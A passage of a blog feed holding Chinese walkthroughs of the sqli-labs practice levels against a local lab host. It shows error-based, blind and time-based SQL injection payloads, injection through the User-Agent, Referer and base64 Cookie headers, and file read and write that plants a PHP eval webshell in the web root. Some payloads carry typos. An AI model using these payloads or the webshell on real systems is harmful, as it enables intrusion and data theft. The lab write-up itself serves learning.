和COOKIE数据</code>自动使用addslashes()，所以不应该对已经转义过的字符串再次使用addslashes，再次使用会导致双层转义。碰到这种情况可以使用get_magic_quotes_gpc()进行检测。</p></li><li><p>语法：</p><table><thead><tr><th align="center">参数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">string</td><td align="center">必需，规定要转义的字符串</td></tr><tr><td align="center">返回值</td><td align="center">返回以转义的字符串</td></tr><tr><td align="center">php版本</td><td align="center">4+</td></tr></tbody></table></li></ul></li><li><p>stripslashes()  该函数用于删除addlashes()函数添加的反斜杠</p></li><li><p>mysql_real_escape_string() 转义sql语句中使用的字符串中的特殊字符</p><ul><li>以下字符受影响</li></ul><pre><code class="hljs sql">\x00\n\r\'"\x1a</code></pre><ul><li><p>函数执行成功，则返回被转义的字符串，失败则返回false</p></li><li><p>语法</p><table><thead><tr><th align="center">参数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">string</td><td align="center">必须，要转义的字符</td></tr><tr><td align="center">connection</td><td align="center">可选，规定mysql连接。如果没规定，则使用上一个连接</td></tr></tbody></table></li><li><p>本行函数将string中的特殊字符进行转义。</p></li></ul></li></ul><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><ul><li>从less17的首页可以看到，本关是一个修改密码过程，利用的是update语句。同利用select语句一致，需要将id的引号闭合触发报错。</li><li>输入恶意语句报错，admin后多出了两个<code>&#39;&#39;</code>说明对密码处理使用了<code>&#39;&#39;</code>。</li></ul><table><thead><tr><th align="center">You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ‘admin’’ at  line 1</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821200723.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>利用盲注进行注入</p><ul><li>报错型盲注，这里uname的值需要是一个已存在的用户。</li></ul><table><thead><tr><th align="center">uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select version()),0x7e)) –+ &amp;submit=Submit</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821202053.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>这里为什么不对username进行注入，瞟一眼源代码就知道了</li></ul><table><thead><tr><th align="center">check_input()函数使用mysql_real_escape_strintg()对username进行了各种转义处理</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821205048.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>更多的payload参考less5</p></li></ul><h2 id="HTTP头介绍"><a href="#HTTP头介绍" class="headerlink" title="HTTP头介绍"></a>HTTP头介绍</h2><ul><li>详细介绍，可以看这篇文章。<code>https://blog.csdn.net/sinat_34166518/article/details/83584910</code></li></ul><h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><ul><li><p>这关不能再对username及passwd进行注入了</p><table><thead><tr><th align="center">从源代码可以看到使用了check_input()函数对用户名及密码进行了检测</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821211921.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>但是呢，从下面insert语句中将useragent和ip插入到了数据库中</p><table><thead><tr><th align="center">$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;            mysql_query($insert);</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200821213658.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li><p>通过修改user-agent来进行注入</p><ul><li>提交数据，账号密码随便输入</li></ul><table><thead><tr><th align="center">使用burpsuite进行截断修改user-agent</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824205928.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>将user-agent修改成payload</li></ul><table><thead><tr><th align="center">‘ and extractvalue(caocat(0x7e,(select version()),0x7e)) and ‘1’ = ‘1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824210625.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><ul><li>从源代码可以看出，less19同样是保存用户的http头部信息。那和上一关基本一致，不过可以换成refere进行注入。</li><li>将referer修改成payload</li></ul><table><thead><tr><th align="center">‘ and updatexml(1,concat(0x7e,(select @@basedir),0x7e),3) and ‘1’ = ‘1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824211339.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>提交后可以看到输出了mysql的路径，其他payload都可以尝试，这里不列举。</li></ul><h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><ul><li>同样从源代码中得知，当cookie从username中获取到值后，会进行查询。也就是说注入点从user-agent或referer变成了cookie。</li><li>尝试进行报错注入，将cookie修改成payload。提交数据后，会发送两个数据包，这里要截断的是带有cookie的数据包</li></ul><table><thead><tr><th align="center">admin ‘  and updatexml(1,(concat(0x7e,(select database()),0x7e)),3) –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824212600.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h3 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h3><ul><li>less21 与less20 的区别在于对cookie进行了base64转换，这里需要将payload进行base64转换</li><li>还有就是对uname进行了(‘uname’)处理。</li></ul><pre><code class="hljs sql">原payload：admin1')and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@basedir),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span>进行了base64转换后的payload：YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSAj</code></pre><table><thead><tr><th align="center">进行base64转换的时候可以利用burp中的decoder模块</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824213429.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><ul><li>less22和less20-21差不多相似，从源代码可以看出对uname进行了 “uname”处理，所以构造payload时要将单引号变成双引号再进行base64编码转换。</li></ul><pre><code class="hljs sql">原payload：admin" and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span>base64payload：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM=</code></pre><table><thead><tr><th align="center">将转码成base64后的payload修改到cookie处提交</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200824214714.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>接触了新知识点，需要重点关注。</li><li>mysql增删改</li><li>http头部信息</li><li>burpsuite decoder功能</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less9-16</title>
    <link href="/2020/08/02/sqli-less9-16/"/>
    <url>/2020/08/02/sqli-less9-16/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-less9-16"><a href="#sqli-less9-16" class="headerlink" title="sqli-less9-16"></a>sqli-less9-16</h1><ul><li>less8 是一个布尔盲注，和less5没什么区别，略过。</li></ul><h3 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h3><ul><li><p>从标题得知，less9<code>&lt;基于时间-单引号&gt;</code>,那这关明显是延迟注入了。</p></li><li><p>闭合前一个单引号，构造的延迟注入语句。(延迟注入不贴图了，记录一下payload)</p><pre><code class="hljs mysql"># 数据库http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;less-9&#x2F;?id&#x3D;1%27 and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep()) --+ #判断数据库的第一位字符ascii是否为115，也就是字母shttp:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),2,1))&#x3D;101,1,sleep(5))--+ # 判断数据库名第二个字符ascii是否为101，也就是e通过多次替换substr()的第二个参数以及if的成立条件的到数据库名security</code></pre><pre><code class="hljs mysql"># 查询security数据库里的数据表http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1%27and If (ascii(substr((select table_name frominformation_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1))&#x3D;101,1,sleep(5))--+通过select语句查询information_schema中的security数据库的第一个表名的第一个字符ascii是否等于101，也就是e，条件成立则sleep(5)依此类推得到emalis</code></pre><pre><code class="hljs mysql"># 查询security库的第二个表查询语句与第一个表差不多，不过需要修改limit的值http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1%27and If (ascii(substr((select table_name frominformation_schema.tables where table_schema&#x3D;&#39;security&#39;limit 1,1),1,1))&#x3D;114,1,sleep(5))--+猜测第二个表名的第一位ascii是否为114也就是r依次类推得到referers</code></pre><pre><code class="hljs mysql"># 猜测username列的值http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;less-9&#x2F;id&#x3D;1%27and if(ascii(substr(select username from users limit 0,1),1,1))&#x3D;68,1,slepp(5)--+猜测username第一行的第一位同样的通过不断尝试得到username，password列的内容，工作量太大不进行操作了</code></pre></li></ul><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><ul><li>从标题得知<code>基于时间-双引号</code>,其实这关和第九关一样只是把id后的单引号替换成双引号。</li><li>只记录一个payload，其他的参考less9</li></ul><pre><code class="hljs mysql"># 猜测数据库http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;less-9&#x2F;?id&#x3D;1%27and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) --+</code></pre><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><ul><li><p>从less11开始url提交参数的方式由GET变成了POST。</p></li><li><p>POST和GET的区别(区别挺多的，这里记一下两个比较直观的)</p><ul><li>GET是从服务器上获取数据，POST是向服务器提交数据</li><li>GET把参数包含在URL中，POST通过requests body提交参数</li></ul></li><li><p>提交参数后浏览器页面会发生变化，不方便截图。这里改用burpsuite来进行操作。</p><ul><li>username输入<code>asdf&#39;</code>密码 <code>asdf</code>在username后输入引号触发报错</li></ul><table><thead><tr><th align="center">从图中可以看到报错信息多了个单引号</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816175731.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>尝试注释后面的引号，输入万能密码试一试，返回了登录信息</li></ul><table><thead><tr><th align="center">asdf’ or 1=1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816180046.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><pre><code class="hljs mysql">这里之所以能登录的原因是因为，当提交了username和password之后，形成的sql语句为@$sql&#x3D;&quot;SELECT username,password FROM users WHERE username &#x3D; &#39;asdf&#39;or&#39;1&#x3D;1 --+ and password &#x3D; &#39;$passwd&#39;LIMIT0,1&quot;;在--+ 后的内容被注释掉了，前面的or 1&#x3D;1 恒成立，所以这条语句能执行成功</code></pre><ul><li>尝试union注入， 可以看到显示的database为security</li></ul><table><thead><tr><th align="center">username: asdf’ union select 1,database() –+</th></tr></thead><tbody><tr><td align="center">passwd: asdf</td></tr><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816180734.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>前面提到的GET型注入的payload都可以使用，这里不重复操作了</li></ul></li></ul><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><ul><li><p>less12和less11相似，不过是id参数处理上有一定不同</p></li><li><p>输入双引号触发报错，从报错信息看到多了一个双引号和)说明这里的id进行了(“id”)处理</p><table><thead><tr><th align="center">username：asdf” passwd:  asdf</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816193330.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>在补全双引号和反括号之后这里同样可以使用上面的payload</p><table><thead><tr><th align="center">username: asdf”) union select  1,version() –+  passwd:asdf</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816181454.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><ul><li><p>输入单引号进行报错</p><table><thead><tr><th align="center">username: admin’ passwd: asdf(随便输)</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816181737.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>看到报错信息为’) ,也就是后台对id进行了(‘id’) 处理</p><table><thead><tr><th align="center">输入正确的账号密码，发现没有提示登录信息，只返回了一个是否登录的凭据</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816182810.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>使用布尔盲注猜测数据库的第一位</p><table><thead><tr><th align="center">username: asdf’) and left(database(),1) &gt; ‘a’ –+ passwd: asdf</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816183436.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>登录成功，接着可以不断对每一位进行测试，less5已经演示了，这里不重复了。</li><li>不过有一个值得注意的是，在测试的时候可以使用二分法可以有效降低测试的次数</li></ul></li></ul><h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><ul><li><p>这关和less13相似，对id的处理把变成了”。</p><table><thead><tr><th align="center">username: admin” passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816183934.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>主要是熟悉盲注的操作，列一下payload</p><table><thead><tr><th align="center">username: admin’ and left(database())&gt;’a’ –+ passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816184139.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>尝试updatexml()报错注入,可以看到通过XPATH报错方式返回了数据库版本号</p><table><thead><tr><th>username: admin’ and updatexml(1,concat(0x7e,(select version()),0x7e),3) –+ passed: admin</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816184505.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><ul><li>这关没有错误提示，只能用延迟注入判断了</li><li>从源代码可以看到查询语句对id进行了’id’处理</li></ul><pre><code class="hljs mysql">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</code></pre><ul><li><p>使用延时注入猜测数据库名第一位</p><table><thead><tr><th align="center">username: admin’ and if(ascii(substr(database(),1,1))=115,1,sleep(5)) –+  passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816191244.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>从burpsuite右下角可以看到延迟了五秒，说明执行成功。其他payload参考less5</p></li></ul><h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><ul><li><p>这关对id的处理方法变成了(“id”)，同样可以使用延迟注入进行解决 。</p></li><li><p>提交payload</p><table><thead><tr><th align="center">username: admin”) and if(ascii(substr(database(),1,1))=115,1,sleep(5)) –+    passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816192248.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>if条件成立则延迟了五秒，其他payload参考前文。</p></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>POST型注入用工具来配合是真滴舒服</li><li>无回显的页面，使用延迟注入效果非常直观</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less7读写文件</title>
    <link href="/2020/08/01/sqli-less7%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/"/>
    <url>/2020/08/01/sqli-less7%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-less7-读写文件"><a href="#sqli-less7-读写文件" class="headerlink" title="sqli-less7 读写文件"></a>sqli-less7 读写文件</h1><h2 id="mysql开启读写权限"><a href="#mysql开启读写权限" class="headerlink" title="mysql开启读写权限"></a>mysql开启读写权限</h2><ul><li><p>在进行读写操作前要先解决一个问题，就是打开mysql读写权限。</p></li><li><p>问题记录</p><table><thead><tr><th align="center">mysql使用load_file()函数查询存在文件时返回null</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815121933.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>查询官方文档得知，mysql5.0以上版本下<code>secure-file-priv</code>字段是用来限制<code>load_file</code> ,<code>out_file</code> 和<code>load_file</code>上传到哪个指定目录</p></li><li><p>mysql导入导出的三个状态</p><table><thead><tr><th align="center">状态</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">ure_file_priv值为null</td><td align="center">不允许导入导出</td></tr><tr><td align="center">secure_file_priv为/tmp/</td><td align="center">限制mysql的导入导出只能在/tmp/目录下</td></tr><tr><td align="center">secure_file_priv没有具体值</td><td align="center">允许导入导出</td></tr></tbody></table></li><li><p>查看secure_file_priv的值</p><table><thead><tr><th align="center">show global variables like ‘%secure%’;</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815123142.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>默认值为null ,不允许导入导出</p></li></ul></li><li><p>解决</p><ul><li>修改mysql.ini文件，在[mysqld]下加入<code>secure_file_priv =</code>保存，重启，再次查询</li></ul><table><thead><tr><th align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815123914.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815145845.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">尝试读取文件</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815145752.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h2><ul><li>select … load_file(“file_name”)</li><li>在使用load_file()导出文件，需要满足以下条件。如果文件不存在，或下面的任一原因，load_file()函数会返回空。在windows下如果设置了ntfs权限，则不能读取相关文件。<ol><li>必须有权限读取并文件须完全可读</li><li>欲读取文件须在服务器上存在</li><li>必须指定文件的完整路径</li><li>读取文件必须小于max_allowed_packet(该字段说用来限制最大传输的值，超过会报错)</li></ol></li><li>注入中需要注意的三点<ol><li>绝对物理路径</li><li>构造可执行的畸形语句</li><li>在导出文件中常用路径：<code>https://www.cnblogs.com/lcamry/p/5729087.html</code></li></ol></li></ul><h2 id="导入文件"><a href="#导入文件" class="headerlink" title="导入文件"></a>导入文件</h2><ul><li><p>select … into outfile “file_name” </p></li><li><p>该文件创建在目标服务器上，需要写入者必须拥有file权限，才能使用此语法。file_name 不能说一个以存在的文件。</p></li><li><p>两种常用的利用形式记注意事项</p><ol><li>将select 内容导入到文件中：</li></ol><pre><code class="hljs mysql">select version() into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre><ul><li>将上一个的version()替换成一句话，<code>&lt;?php @eval($_POST[passwd])?&gt;</code>,即</li></ul><pre><code class="hljs mysql">select &lt;?php @eval($_POST[passwd])?&gt; into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre><ol start="2"><li>修改文件结尾：</li></ol><pre><code class="hljs mysql">select version() into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39; lines thrminated by 0x16进制文件</code></pre><ul><li>by 后面的内容，通常为<code>\r\n</code>,此处可以修改by后面的十六进制文件。（sqlmap –os-shell参数用的就是这个方法）</li></ul><ol start="3"><li>注意事项</li></ol><ul><li>文件路径可能要转义，这个视环境而定。</li><li>如果load_file无法导出文件时，可以使用这个语句</li></ul><pre><code class="hljs mysql">select load_file(&quot;c:&#x2F;&#x2F;flag.txt&quot;) into outfile  &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre></li></ul><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><ul><li><p>从源代码中得知，查询语句对id参数进行了’))处理</p><table><thead><tr><th align="center">$sql=”SELECT*FROMusersWHEREid=((‘$id’))LIMIT0,1”;</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815132444.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>这里可以用’)) or 1=1 –+进行注入</p><table><thead><tr><th align="center"><a href="http://192.168.5.135/sqli/Less-7/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-7/?id=1&#39;</a>)) or 1=1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815133500.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>用上述的方法写入文件</p><pre><code class="hljs mysql">union select 1,&lt;?php phpinfo()?&gt;,3 into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\1.php&#39;</code></pre><ul><li>这里可能是phpstudy的问题，写入成功了，但是没有解析php</li></ul></li></ul><table><thead><tr><th align="center"><a href="http://192.168.3.5:80/sql/Less-7/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.3.5:80/sql/Less-7/?id=-1&#39;</a>)) union select 1,”&lt;php phpinfo() ;?&gt;”,3 into outfile “C://wamp/www/sql/Less-7/2.php”–+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815143751.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><ul><li><p>less7没有回显，改用less1进行操作</p><pre><code class="hljs mysql">union select 1,load_file(&#39;c:&#x2F;&#x2F;flag.txt&#39;) --+</code></pre><table><thead><tr><th align="center"><a href="http://192.168.5.135/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=-1&#39;</a> union select 1,load_file(“C://flag.txt”),3 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815144258.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>这个读写文件路径问题真的是个大坑，需要注意</li><li>还有系统环境也是个坑，分别用wamp和phpstudy搭建，出现的问题都不一样。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less5-6盲注</title>
    <link href="/2020/08/01/sqli-less5-6%E7%9B%B2%E6%B3%A8/"/>
    <url>/2020/08/01/sqli-less5-6%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="less5-6盲注"><a href="#less5-6盲注" class="headerlink" title="less5-6盲注"></a>less5-6盲注</h1><h2 id="盲注知识点"><a href="#盲注知识点" class="headerlink" title="盲注知识点"></a>盲注知识点</h2><ul><li><p>什么是盲注？盲注就是再sql注入过程中，sql语句执行后，查询的数据不能回显到前端页面，此时需要利用一些方法进行判断或尝试，这个过程称之为盲注</p></li><li><p>从前面的sqli手注基础中，可以得知盲注分为三类</p><ul><li>基于布尔的sql盲注</li><li>基于时间的sql盲注</li><li>基于报错的sql盲注</li></ul></li><li><p>四个常用函数</p><ul><li><p>mid()  此函数用来截取字符串</p><table><thead><tr><th>参数</th><th align="center">解释</th></tr></thead><tbody><tr><td>column_name</td><td align="center">必须，要提取字符的字段</td></tr><tr><td>start</td><td align="center">必需，规定的起始位置 （起始值为1）</td></tr><tr><td>length</td><td align="center">可选，要返回的字符数，如果省略，则mid()函数返回剩余文本</td></tr></tbody></table><pre><code class="hljs mysql">用法：str&#x3D;&quot;1234&quot;mid(str,2,1) 结果返回2mid((select table_name from information_schema.table where table_schema&#x3D;0xxx limit 0,1)1,1)) &gt; &quot;a&quot;此处的column_name参数可以为sql语句</code></pre></li></ul></li></ul><ul><li><p>substr(column_name,start,length) 这个函数同substring()函数实现的功能是一样的，均为截取字符串，参数同mid()函数，不再重复列举</p><pre><code class="hljs mysql">substr(database(),1,2) &gt;&#39;a&#39; 查看数据库名的第一位substr((select table_name from information_schema.table where table_schema&#x3D;0xxx limit 0,1)1,1) &gt; &#39;a&#39; 此处的column_name参数可以为sql语句</code></pre></li></ul><ul><li><p>left(string,n) 得到字符串左部指定个数的字符</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>string</td><td>截取的字符串</td></tr><tr><td>n</td><td>截取长度</td></tr></tbody></table><pre><code class="hljs mysql">用法left(database()),2 &gt; &#39;a&#39; 查数据库名第一位left(database()),2 &gt; &#39;ab&#39; 查数据库名前两位同样的string可以为自行构造的sql语句</code></pre></li><li><p>udpatexml()</p><table><thead><tr><th>参数</th><th align="center">解释</th></tr></thead><tbody><tr><td>XML_document</td><td align="center">为xml文档对象的名称</td></tr><tr><td>XPath_string</td><td align="center">XPath格式的字符串</td></tr><tr><td>new_value</td><td align="center">string格式，替换查找到符合条件的的数据</td></tr></tbody></table><pre><code class="hljs mysql">用法select name from user where id&#x3D;1 and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);updatexml() 第二个参数需要xpath格式的字符串，concat()函数为字符串连接函数显然不符合updatexml()的第二个函数需求，所以会将执行结果以报错的形式返回，这样就可以实现报错注入了结果</code></pre><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815102805.png" srcset="/img/loading.gif" alt=""></p></li></ul><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><ul><li><h3 id="基于时间延迟的盲注"><a href="#基于时间延迟的盲注" class="headerlink" title="基于时间延迟的盲注"></a>基于时间延迟的盲注</h3><ul><li>延迟注入，正确的会延迟执行，错误没有延迟，id值无所谓，可通过f12抓包查看延迟状况</li><li>爆数据库长度payload</li></ul><pre><code class="hljs mysql">and if(length(database())&#x3D;8,sleep(5),1) --+  # 判断当前数据库名长度是否为八个字节，是的话延迟5秒执行</code></pre><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=1&#39;</a> and if(length(database())=8,sleep(5),1) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814175503.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>爆数据库名payload</li></ul><pre><code class="hljs mysql">and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+ # 判断当前数据库名第一个字节是否为s，是的话延迟五秒执行通过不断替换&#x3D;后面的字符串，正确的字符串会延迟返回，工作量超大这里不赘述</code></pre><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814181925.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" 